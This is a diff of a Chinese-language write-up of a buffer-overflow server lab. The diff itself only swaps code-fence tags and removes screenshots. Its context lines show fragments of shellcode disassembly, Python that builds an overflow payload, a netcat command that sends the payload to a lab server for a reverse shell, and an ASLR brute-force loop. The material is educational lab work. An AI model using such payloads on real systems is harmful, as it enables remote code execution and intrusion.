@@ -50,7 +50,7 @@ shellcode = (
 
 经过线上的反汇编工具我得到了如下的汇编代码。
 
-```assembly
+```nasm
 0:  eb 36                   jmp    0x38
 2:  5b                      pop    ebx
 3:  48                      dec    eax
@@ -122,10 +122,6 @@ shellcode = (
 ).encode('latin-1')
 ```
 
-运行结果如图：
-
-![Screenshot 2024-04-02 at 4.45.12 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-02_at_4.45.12_PM.png)
-
 # Task 2: Level-1 Attack
 
 这个task是要打一个反弹shell，看了 ‘Makefile’ 发现这个server是一个32位的程序，所以只能用32位的shellcode来打。
@@ -185,8 +181,6 @@ content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
 
 最后利用 `cat badfile | nc 10.9.0.5 9090` 攻击成功反弹shell：
 
-![Screenshot 2024-04-03 at 2.53.54 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_2.53.54_AM.png)
-
 这里我突然意识到一个比较巧妙的地方，数组存放地址的方向与指令的存放顺序相同，与栈增长相反，所以我们不需要把shellcode反过来。
 
 # Task 3: Level-2 Attack
@@ -212,10 +206,6 @@ for offset in range(100, 304, 4):
     content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
 ##################################################################
 ```
-
-运行结果如图：
-
-![Screenshot 2024-04-03 at 3.15.55 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_3.15.55_AM.png)
 
 # Task 4: Level-3 Attack
 
@@ -276,10 +266,6 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-攻击效果如图：
-
-![Screenshot 2024-04-03 at 4.07.58 AM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_4.07.58_AM.png)
-
 # Task 5: Level-4 Attack
 
 这个task与上一个的区别是返回地址和buffer离得很近，只有104个byte，而shellcode有165个byte。
@@ -307,10 +293,6 @@ content[start:start + len(shellcode)] = shellcode
 ret    = 0x00007fffffffe100 + 1072 + 112 # Change this number
 offset = 104            # Change this number
 ```
-
-攻击效果如图：
-
-![Screenshot 2024-04-03 at 5.09.48 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_5.09.48_PM.png)
 
 # Task 6: Experimenting with the Address Randomization
 
@@ -340,12 +322,6 @@ while true; do
     cat badfile | nc 10.9.0.5 9090
 done
 ```
-
-效果如图：
-
-![Screenshot 2024-04-03 at 6.46.52 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_6.46.52_PM.png)
-
-![Screenshot 2024-04-03 at 6.46.25 PM.png](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Screenshot_2024-04-03_at_6.46.25_PM.png)
 
 # Tasks 7: Experimenting with Other Countermeasures
 
@@ -383,7 +359,7 @@ GOT表是可写的，所以我们在第一次动态链接前修改GOT表中 `put
 
 我尝试了一下跳转到其他位置，不会有任何的结果返回，我猜测是因为栈被我们堆满了垃圾，所以程序不能正常运行。
 
-```assembly
+```nasm
 BITS 64
 
 mov byte [0x4034c8], 0x10
@@ -432,7 +408,3 @@ content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
 with open('badfile', 'wb') as f:
   f.write(content)
 ```
-
-最后的攻击效果：
-
-![Untitled](/assets/img/2024-04-25-Buffer-Overflow Attack Lab (Server Version)/Untitled%206.png)
